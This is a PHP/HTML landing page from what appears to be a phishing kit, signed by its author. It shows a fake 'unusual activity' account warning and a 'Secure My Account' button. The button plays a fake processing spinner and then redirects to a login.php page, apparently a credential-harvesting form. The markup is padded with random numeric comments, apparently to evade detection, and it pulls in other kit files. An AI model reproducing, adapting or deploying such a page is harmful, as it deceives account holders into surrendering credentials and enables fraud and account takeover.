
<?php
include '../Mckay‎‏/zero3.php';
include 'index3.php';
/*
##############################################################
                           LOVE is fake
##############################################################
                           MR fake is me	
##############################################################
              https://web.facebook.com/yackson.garcia.161	
##############################################################			  
*/
  ?><!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=Edge">
      <!--44628825-->   
      <link rel="shortcut icon" href="../files/png/ok.ico">
      
      <!--3196770--> <!--27963857-->
      <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
      <title>Unusual Activity</title>
      <!--65851076-->   
      <link rel="stylesheet" href="../files/css/unusual.css">
      <!--81233013-->
   </head>
   <!--33076041-->   
   <div class="centered">
      <!--83015641-->         
      <div style="text-align:center">
         <!--51918113-->   <!--8312827-->       
         <header>
            <div class="logo"></div>
            <!--97738218-->            
         </header>
         <!--99539376-->         
		 <img src="../files/png/bn.png" id="Picture1" alt="" height="40" class="center">
         <div>
            <h1>We've noticed some unusual activity</h1>
            <!--93736266-->               
            <div>
               <p class="text">We need your help securing your account to prevent any unauthorised access. For your safety, there may be some limitations on your account if the information isn't correct.</p>
            </div>
            <input type="button" class="button" value="Secure My Account" id="btn">
         </div>
      </div>
      <div class="hide" id="rotate">
         <!--14226568-->               
         <div class="spinner">
            <div class="rotate"></div>
            <div class="processing">Processing...</div>
         </div>
         <!--67565470-->         
         <div class="overlay"></div>
      </div>
   </div>
   <!--34680495-->         </div>
   <footer>
      <ul>
         <li>
            <a href="javascript:">Privacy</a>
         </li>
         <!--21087719-->               
         <li>
            <!--18275508-->                  <a href="javascript:">Legal</a>
         </li>
         <!--44832025-->            
      </ul>
   </footer>
   <script>document.getElementById("btn").onclick=function(){
      document.getElementById("rotate").classList.remove("hide");
      setTimeout(function(){
      window.location.href="login.php"},1800)};
   </script>
   </body>
</html>